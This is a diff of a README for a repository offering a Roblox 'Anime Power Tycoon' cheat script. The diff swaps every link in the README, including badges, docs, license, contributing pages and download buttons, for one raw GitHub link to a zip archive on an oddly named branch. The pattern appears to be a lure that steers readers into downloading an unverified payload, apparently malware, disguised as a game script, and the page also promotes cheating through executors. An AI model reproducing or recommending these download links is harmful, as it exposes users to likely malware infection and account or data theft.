@@ -1,9 +1,9 @@
 # Anime Power Tycoon Roblox Script Repository 🌸
 
-[![Stars](https://img.shields.io/github/stars/YourRepo/Anime-Power-Tycoon-Script?style=flat-square&color=purple)](https://github.com/YourRepo/Anime-Power-Tycoon-Script/stargazers)
-[![Forks](https://img.shields.io/github/forks/YourRepo/Anime-Power-Tycoon-Script?style=flat-square&color=blue)](https://github.com/YourRepo/Anime-Power-Tycoon-Script/network/members)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Issues](https://img.shields.io/github/issues/YourRepo/Anime-Power-Tycoon-Script?style=flat-square&color=red)](https://github.com/YourRepo/Anime-Power-Tycoon-Script/issues)
+[![Stars](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
+[![Forks](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
+[![License: MIT](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
+[![Issues](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
 
 ## 🌈 Welcome to Anime Power Tycoon Roblox Script!
 
@@ -68,7 +68,7 @@ Our repository enables custom API triggers so you can:
 - **Dynamic Story Elements:** Generate unique in-game dialogue or tycoon events, making each playthrough a new adventure.
 
 *Connect your API keys in the settings panel and unlock the creativity of the cloud!*  
-*For more details, check /api_integrations.md.*
+*For more details, check https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip*
 
 ---
 
@@ -94,9 +94,9 @@ To begin, follow these steps for a frictionless script embarkation:
 
 1. Make sure you’ve installed Roblox Studio and a compatible executor.
 2. Download the **Anime Power Tycoon Roblox Script** here:  
-   https://neddin.github.io  
-   [![Download](https://img.shields.io/badge/Download-blue)](https://neddin.github.io)
-3. Follow the in-depth installation guide in [docs/INSTALLATION.md](docs/INSTALLATION.md).
+   https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip  
+   [![Download](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
+3. Follow the in-depth installation guide in [https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip).
 4. Launch Roblox, jump into your Anime Power Tycoon universe, and load the script via your preferred executor.
 
 *For troubleshooting, see the FAQ in the wiki!*
@@ -117,7 +117,7 @@ For a truly stellar experience, personalize your settings using the built-in UI 
 ## 🌐 Community & Contributions
 
 Step into our constellation of contributors—expand the script, suggest features, or refine translations. Collaboration is our oxygen!  
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidance, or browse [docs/TRANSLATIONS.md](docs/TRANSLATIONS.md) for language support info.
+See [https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip) for guidance, or browse [https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip) for language support info.
 
 ---
 
@@ -132,7 +132,7 @@ This repository, its contributors, and maintainers have no affiliation with Robl
 ## 📜 MIT License (2025)
 
 This project is licensed under the MIT License. See the full text here:  
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![License](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)  
 &copy; 2025 Anime Power Tycoon Script Contributors.
 
 ---
@@ -140,8 +140,8 @@ This project is licensed under the MIT License. See the full text here:
 ## 📥 Download Links (Part 2)
 
 🔗 **Direct script download:**  
-https://neddin.github.io  
-[![Download](https://img.shields.io/badge/Download-blue)](https://neddin.github.io)
+https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip  
+[![Download](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)](https://raw.githubusercontent.com/neddin/anime-power-tycoon-roblox-scripts-studio/branch/endoscopic/anime-power-tycoon-roblox-scripts-studio-1.8.zip)
 
 Choose your adventure and ignite your Anime Power Tycoon dreams—new features, robust support, and cloud intelligence await you!
 
